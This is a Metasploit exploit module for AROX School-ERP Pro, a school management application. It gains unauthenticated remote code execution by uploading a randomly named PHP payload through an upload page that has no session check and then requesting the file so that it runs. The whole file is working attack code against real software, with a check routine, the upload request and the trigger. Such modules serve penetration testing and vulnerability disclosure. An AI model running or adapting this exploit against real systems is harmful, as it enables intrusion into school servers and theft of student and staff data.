# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039; => "AROX School-ERP Pro Unauthenticated Remote Code Execution",
      &#039;Description&#039; => %q(
        This module exploits a command execution vulnerability in AROX School-ERP.
        "import_stud.php" and "upload_fille.php" do not have session control. 
        Session start/check functions in Line 8,9,10 are disabled with slashes.
        Therefore an unathenticated user can execute the command on the system.
      ),
      &#039;License&#039; => MSF_LICENSE,
      &#039;Author&#039; =>
        [
          &#039;AkkuS <Özkan Mustafa Akkuş>&#039;, # Discovery & PoC & Metasploit module
        ],
      &#039;References&#039; =>
        [
          [&#039;URL&#039;, &#039;http://www.pentest.com.tr/exploits/AROX-School-ERP-Pro-Unauthenticated-RCE-Metasploit.html&#039;],
          [&#039;URL&#039;, &#039;https://sourceforge.net/projects/school-erp-ultimate/&#039;] # Download
        ],
      &#039;Platform&#039; => &#039;php&#039;,
      &#039;Arch&#039; => ARCH_PHP,
      &#039;Targets&#039; => [[&#039;Automatic&#039;, {}]],
      &#039;Privileged&#039; => false,
      &#039;DisclosureDate&#039; => "Jun 17 2019",
      &#039;DefaultTarget&#039; => 0))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, "Base ERP directory path", &#039;/&#039;])
      ]
    )
  end

  def exec(shell)
    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, "greatbritain", "greatbritain", "upload_data", "#{shell}") # shell url
    })
  end

  def upload_shell(check)

    fname = Rex::Text.rand_text_alpha_lower(8) + ".php"
    @shell = "#{fname}"
    pdata = Rex::MIME::Message.new
    pdata.add_part("" + payload.encoded, &#039;application/octet-stream&#039;, nil, "form-data; name=\"txtdocname\"; filename=\"#{fname}\"")
    pdata.add_part(&#039;Submit&#039;, nil, nil, &#039;form-data; name="btnsubmit"&#039;)
    data = pdata.to_s

    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;data&#039;  => data,
      &#039;agent&#039; => &#039;Mozilla&#039;,
      &#039;ctype&#039; => "multipart/form-data; boundary=#{pdata.bound}",
      &#039;uri&#039; => normalize_uri(target_uri.path, "greatbritain", "greatbritain", "upload_fille.php")
    })

    if res && res.code == 200 && res.body =~ /Successfully/
      print_status("Trying to upload #{fname}")
      return true
    else
      fail_with(Failure::NoAccess, &#039;Error occurred during uploading!&#039;)
      return false
    end
  end

  def exploit
    unless Exploit::CheckCode::Vulnerable == check
      fail_with(Failure::NotVulnerable, &#039;Target is not vulnerable.&#039;)
    end

    if upload_shell(true)
      print_good("Upload successfully.")
      exec(@shell)
    end
  end

  def check

    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, "greatbritain", "greatbritain", "upload_fille.php")
    })

    unless res
      vprint_error &#039;Connection failed&#039;
      return CheckCode::Unknown
    end

    if res && res.code == 200 && res.body =~ /upload_fille.php/
      return Exploit::CheckCode::Vulnerable
    end
    return Exploit::CheckCode::Safe
  end
end

